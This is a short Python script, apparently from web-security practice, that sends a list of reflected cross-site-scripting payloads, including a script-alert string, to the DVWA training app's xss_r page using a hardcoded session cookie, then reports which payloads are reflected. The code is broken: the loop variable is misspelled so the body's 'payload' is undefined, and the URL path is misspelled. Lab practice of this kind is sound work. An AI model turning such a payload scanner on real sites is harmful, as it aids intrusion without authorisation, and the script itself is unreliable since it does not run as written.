import requests
header={"Cookie":"security=medium; PHPSESSID=a8b29e43b154e8cf261c3686bdd94"}
xss_list=["siber","<h1>siber","<script>alert('siber')</script>"]
for ayload in xss_list:
    print(payload)
    url="http://10.10.10.10/dvwa/ulnersbilites/xss_r/?name="+str(payload)
    sonuc=requests.get(url=url,headers=header)
    if str(payload) in str(sonuc.content):
        print("Muhtemelen XSS var:",str(payload))